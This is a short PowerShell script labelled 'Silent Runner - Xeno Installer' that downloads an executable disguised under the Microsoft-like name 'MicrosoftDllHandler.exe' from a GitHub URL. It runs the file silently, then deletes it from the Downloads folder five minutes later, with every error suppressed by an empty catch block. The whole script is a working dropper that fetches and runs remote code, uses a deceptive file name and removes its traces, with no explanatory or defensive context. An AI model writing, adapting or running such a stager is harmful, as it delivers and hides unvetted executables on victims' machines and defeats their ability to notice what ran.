# Silent Runner - Xeno Installer
$payloadUrl = "https://github.com/hypnotixx0/xenolord/raw/main/MicrosoftDllHandler.exe"
$payloadPath = "$env:USERPROFILE\Downloads\MicrosoftDllHandler.exe"

try {
    # Download the file
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($payloadUrl, $payloadPath)
    $webClient.Dispose()
    
    Start-Sleep -Seconds 3
    
    $serverSize = (Invoke-WebRequest -Uri $payloadUrl -Method Head -UseBasicParsing).Headers['Content-Length']
    $localSize = (Get-Item $payloadPath).Length
    
    while ($localSize -ne $serverSize) {
        Start-Sleep -Seconds 1
        $localSize = (Get-Item $payloadPath).Length
    }
    
    Start-Sleep -Seconds 2
    
    Start-Process -FilePath $payloadPath
    
    # Wait 5 minutes then delete from Downloads
    Start-Sleep -Seconds 300
    Remove-Item -Path $payloadPath -Force -ErrorAction SilentlyContinue
} catch {}
